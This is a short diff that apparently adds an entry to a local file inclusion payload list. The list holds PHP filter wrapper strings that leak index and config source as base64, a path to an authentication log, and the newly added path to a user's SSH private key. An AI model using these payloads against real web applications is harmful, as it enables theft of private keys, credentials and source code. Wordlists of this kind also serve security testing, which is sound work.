@@ -1,3 +1,4 @@
+/home/username/.ssh/id_rsa
 php://filter/convert.base64-encode/resource=index
 php://filter/convert.base64-encode/resource=config
 /var/log/auth
